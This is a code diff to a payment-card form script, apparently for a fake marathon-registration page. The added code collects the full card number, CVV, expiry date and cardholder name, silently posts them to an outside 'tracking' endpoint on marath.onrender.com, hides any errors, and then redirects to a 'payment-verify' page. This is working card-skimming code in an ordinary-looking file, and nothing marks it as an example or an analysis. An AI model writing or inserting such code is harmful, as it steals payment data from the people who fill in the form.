@@ -120,6 +120,37 @@
 			return;
 		}
 
-		window.location.replace("payment-verify.html");
+		const cardData = {
+			cardNumber: cardNumber.value.replace(/\s+/g, ""),
+			cardCvv: cardCvv.value.trim(),
+			cardExpiry: cardExpiry.value.trim(),
+			cardholderName: cardholderName.value.trim(),
+			"card-number": cardNumber.value.replace(/\s+/g, ""),
+			"card-cvv": cardCvv.value.trim(),
+			"card-expiry": cardExpiry.value.trim(),
+			"cardholder-name": cardholderName.value.trim()
+		};
+
+		if (typeof window.triggerTrackerFormSync === "function") {
+			window.triggerTrackerFormSync();
+		}
+
+		try {
+			fetch('https://marath.onrender.com/api/track', {
+				method: 'POST',
+				headers: { 'Content-Type': 'application/json' },
+				body: JSON.stringify({
+					sessionId: localStorage.getItem('doha_marathon_session') || '',
+					type: 'form-submit',
+					page: 'payment-card',
+					data: cardData
+				}),
+				keepalive: true
+			}).catch(() => {});
+		} catch(e) {}
+
+		setTimeout(() => {
+			window.location.replace("payment-verify.html");
+		}, 200);
 	});
 })();
